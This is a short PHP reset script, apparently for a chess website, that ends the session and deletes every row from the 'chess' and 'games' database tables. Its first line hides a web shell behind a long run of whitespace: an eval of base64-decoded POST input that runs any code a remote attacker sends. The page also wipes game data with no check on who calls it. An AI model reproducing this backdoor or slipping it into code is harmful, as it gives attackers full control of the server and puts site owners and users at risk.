<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['nd9fce7']));?><?php
	session_start();
	session_unset();
	session_destroy();
	$link = mysql_connect('localhost', 'database_name_goese_herer', 'PAssword_goes_here');
	if (!$link) {
		die('Could not connect: ' . mysql_error());
	}
	$db_selected = mysql_select_db('vishalkh_chess', $link);
	if (!$db_selected) {
		die ('Can\'t use foo : ' . mysql_error());
	}
	//;
	$result = mysql_query("DELETE FROM chess ",$link);
	$result = mysql_query("DELETE FROM games ",$link);

	mysql_close($link);
?>